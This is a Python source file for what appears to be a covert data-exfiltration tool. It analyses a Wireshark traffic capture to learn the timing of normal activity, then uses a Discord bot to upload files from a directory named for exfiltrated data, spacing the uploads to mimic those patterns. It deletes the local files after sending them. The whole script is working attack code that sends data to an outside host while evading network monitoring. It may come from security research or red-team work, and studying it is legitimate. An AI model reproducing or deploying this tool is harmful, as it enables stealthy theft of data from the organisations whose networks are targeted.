import pandas as pd
import numpy as np
import discord
import asyncio
from discord.ext import tasks
import argparse
from dotenv import load_dotenv
import os
from support_library import get_token, gather_files, clean_files

CHANNEL_ID = 1298955028597440555 # Replace with the actual channel ID

class TrafficSimulator(discord.Client):
    
    def __init__(self, counts, bin_edges, possible_file_uploads, exfiltrated_files_directory, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.counts = counts
        self.bin_edges = bin_edges
        self.possible_file_uploads = possible_file_uploads
        self.exfiltrated_files_directory = exfiltrated_files_directory

    async def on_ready(self):
        print(f'Logged in as {self.user}')
        print(f'Starting traffic simulation...')
        await self.simulate_traffic()
    
    async def send_file(self, channel, file_path):
        """Send a single file to the channel."""
        await channel.send("Here is your attachment:", file=discord.File(file_path))
        print(f"Sent {file_path} with {os.path.getsize(file_path) / 1024 ** 2:.2f} MB.")

    async def simulate_traffic(self):
        """
        Simulate traffic based on histogram data.
        """
        channel = self.get_channel(CHANNEL_ID)
        if not channel:
            print("Channel not found. Ensure the CHANNEL_ID is correct.")
            return

        # Given the histogram obtain the probability of each bin
        probabilities = self.counts / np.sum(self.counts)

        # Print the probabilities
        print("Probabilities:")
        print(probabilities)
        files = gather_files(self.exfiltrated_files_directory)
        print(f"Files: {files}")

        # Simulate traffic based on the probabilities of the intervals
        while files!=[]:

            # Choose an interval based on the probabilities
            interval = np.random.choice(self.bin_edges[:-1], p=probabilities)
            print(f"\nThe file was sended with {interval} seconds of interval")
            # send the last item in the files list
            await self.send_file(channel, files.pop())

            # Wait for the next interval
            await asyncio.sleep(interval)

        clean_files(self.exfiltrated_files_directory)

        print("Closing the bot.")
        await self.close()


def process_traffic(input_file: str, silence_threshold : int = 5, packet_threshold: int = 200) -> tuple:
    # Load the CSV file exported from Wireshark (remove the index column if it exists)
    data = pd.read_csv(input_file)

    # Convert 'Time' column to seconds (assuming it's already relative to the start)
    data['Time'] = data['Time'].astype(float)

    # Define time intervals
    interval = 10  # Interval duration in seconds
    data['Time_Interval'] = (data['Time'] // interval).astype(int)

    # Calculate the start and end time of each interval
    data['Time Started'] = data['Time_Interval'] * interval
    data['Time Ended'] = (data['Time_Interval'] + 1) * interval

    # Aggregate by interval, including protocol counts
    data_summary = data.groupby(['Time Started', 'Time Ended']).size().reset_index(name='Packet Count')

    # Filter the data with more than 200 packets
    data_filtered = data_summary[data_summary['Packet Count'] > silence_threshold]

    print("Filtered Data:")
    print(data_filtered)

    # Obtain the average of the packet count (as integer)
    average_packet_count = int(data_filtered['Packet Count'].mean())

    # Print the average packet count
    print(f"Average packet count per interval: {average_packet_count}")

    data_activity = data_filtered[data_filtered['Packet Count'] > average_packet_count]

    # Obtain the intervals between each activity in an array (in seconds)
    time_between_activity = [
        data_activity.iloc[row + 1]['Time Started'] - data_activity.iloc[row]['Time Ended']
        for row in range(len(data_activity) - 1)
    ]

    possible_file_uploads = []
    for row in range(len(data_activity) - 1):
        time_gap = data_activity.iloc[row + 1]['Time Started'] - data_activity.iloc[row]['Time Ended']
        packet_count = data_activity.iloc[row]['Packet Count']
        if time_gap == 0 and packet_count >= packet_threshold:
            possible_file_uploads.append((data_activity.iloc[row]['Time Started'], packet_count))

    if possible_file_uploads:
        print("\nPossible File Uploads Detected:")
        for upload in possible_file_uploads:
            print(f"Start Time: {upload[0]}, Packet Count: {upload[1]}")
    else:
        print("\nNo file uploads detected.")


    # Compute histogram data
    counts, bin_edges = np.histogram(time_between_activity, bins=50)

    return counts, bin_edges, possible_file_uploads

def main():
    parser = argparse.ArgumentParser(description="Process Wireshark UDP traffic data and send messages via Discord.")
    parser.add_argument("-i", "--input", required=True, help="Path to the input CSV file")
    args = parser.parse_args()

    counts, bin_edges, possible_file_uploads = process_traffic(args.input)

    intents = discord.Intents.default()
    intents.messages = True

    DISCORD_TOKEN = get_token("DISCORD_TOKEN")

    client = TrafficSimulator(counts, bin_edges, possible_file_uploads, "data", intents=intents)
    client.run(DISCORD_TOKEN)

if __name__ == "__main__":
    main()